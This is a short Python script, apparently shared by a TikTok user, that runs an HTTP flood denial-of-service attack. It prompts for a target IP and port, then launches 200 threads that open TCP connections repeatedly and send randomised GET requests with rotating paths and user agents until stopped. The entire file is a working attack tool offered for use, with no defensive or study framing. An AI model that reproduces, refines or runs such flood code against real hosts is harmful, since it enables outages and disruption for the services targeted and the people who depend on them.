import socket
import threading
import random
import time
import os

TARGET_IP = input("TARGET IP: ")
TARGET_PORT = int(input("OPEN PORT: "))
os.system("clear")
print("MADE BY apexvr_ ON TIKTOK")
NUM_THREADS = 200

def random_http_request():
    paths = ["/", "/index.html", "/about", "/contact", "/login"]
    user_agents = [
        "Mozilla/5.0",
        "Chrome/90.0",
        "Safari/537.36",
        "Opera/9.80",
        "Edge/18.18363"
    ]
    path = random.choice(paths)
    agent = random.choice(user_agents)
    request = f"GET {path} HTTP/1.1\r\nHost: {TARGET_IP}\r\nUser-Agent: {agent}\r\nConnection: keep-alive\r\n\r\n"
    return request.encode()

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, TARGET_PORT))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            while True:
                s.sendall(random_http_request())
        except Exception:
            s.close()
            time.sleep(0.1)

threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=flood, name=f"Wątek-{i+1}", daemon=True)
    t.start()
    threads.append(t)

print(f"Flood started at {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} threads. Stop with Ctrl+C.")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nFlood ended (Ctrl+C)")
